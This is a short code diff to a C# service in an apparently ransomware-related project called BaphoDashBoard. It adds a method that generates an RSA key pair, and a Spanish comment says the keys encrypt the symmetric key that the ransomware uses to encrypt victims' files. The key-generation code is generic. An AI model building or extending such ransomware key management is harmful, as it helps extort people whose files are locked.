@@ -224,6 +224,23 @@ namespace BaphoDashBoard.DAL.Services
             return result;
         }
 
+        //genero las llaves rsa, encargadas de cifrar llave simetrica que genera el ransomware para cifrar los archivos.
+        public RsaKeysDTO GenerateRsaKeys()
+        {
+            RsaKeysDTO result = new RsaKeysDTO();
+            try
+            {
+                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
+                result.PublicKey = rsa.ToXmlString(false);
+                result.PrivateKey = rsa.ToXmlString(true);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+            return result;
+        }
+
         static string GetMd5Hash(MD5 md5Hash, string input)
         {
             // Convert the input string to a byte array and compute the hash.
